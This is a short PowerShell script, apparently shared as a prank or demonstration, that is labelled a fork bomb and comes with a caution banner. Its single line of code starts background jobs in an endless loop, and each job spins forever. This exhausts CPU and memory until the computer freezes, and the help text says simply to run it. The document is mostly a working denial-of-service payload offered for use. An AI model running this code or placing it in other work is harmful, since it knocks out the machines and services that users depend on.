﻿#==========================================================#
#                    ¡¡ CAUTION !!                         #
# This script can freeze the computer, but keep calm,      #
# if you restart or kill all the child process its all OK  #
#                                                          #
#     Dont use it on critic/server enviroment, please.     #
#==========================================================#
<#
.SYNOPSIS
  Fork Bomb (Another version)
.DESCRIPTION
  Try to freez the PC creating, exponentially, a child process for any running process
.NOTES
  Version:        1.0
  Author:         Hacksturcon (G.R.G)
  Creation Date:  19/08/2018
.EXAMPLE
  Just run the script.
#>
For(){ Sajb{ For(){ } } }
